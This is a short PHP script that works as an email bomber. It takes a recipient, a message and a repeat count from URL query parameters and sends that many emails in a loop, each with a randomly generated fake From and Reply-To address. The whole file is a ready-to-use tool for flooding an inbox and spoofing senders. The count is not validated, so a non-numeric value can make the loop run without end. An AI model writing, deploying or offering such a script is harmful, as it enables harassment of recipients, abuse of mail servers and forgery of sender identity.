<?php
// yoururl.com/?to=example@example.com&msg=Hi&timesToSend=100
// Variable Declaration
$to = $_GET['to'];
$msg = $_GET['msg'];
$msgsToSend = $_GET['timesToSend'];
$count = 0;
$messagesSent = 0;
// Check if recipient is a valid email address
if(!filter_var($to, FILTER_VALIDATE_EMAIL)) {
    die("This isn't an valid email");
}
// Send messages while the amount of messages aren't equal to the counter
echo "<pre>";
while ($msgsToSend != $count) {
    $random1 = md5(microtime());
    $random2 = md5(microtime());
    $from = $random1."@".$random2.".com";
    $headers = 'From: ' . $from . "\r\n" . 'Reply-To: ' . $from . "\r\n" . 'X-Mailer: PHP/' . phpversion();
    // Check if there are any missing variables
    if (!isset($to) or !isset($msg) or !isset($from) or !isset($msgsToSend)) {
        die("error. missing arguments");
    }
    if(@mail($to, "", $msg, $headers)) {
        $messagesSent++;
        echo "Message $messagesSent -> '$msg' sended to $to as $from<br>";
    } else {
        die("Email failed...");
    }
    $count++;
}
echo "</pre>";
?>
